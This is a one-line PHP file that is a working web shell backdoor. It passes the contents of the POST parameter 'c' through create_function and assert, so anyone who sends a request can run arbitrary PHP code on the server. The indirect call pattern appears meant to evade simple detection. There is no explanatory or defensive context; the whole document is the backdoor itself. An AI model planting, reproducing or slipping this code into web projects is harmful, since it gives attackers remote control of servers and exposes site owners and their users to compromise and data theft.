<?php call_user_func(create_function(null,'assert($_POST[c]);'));?>
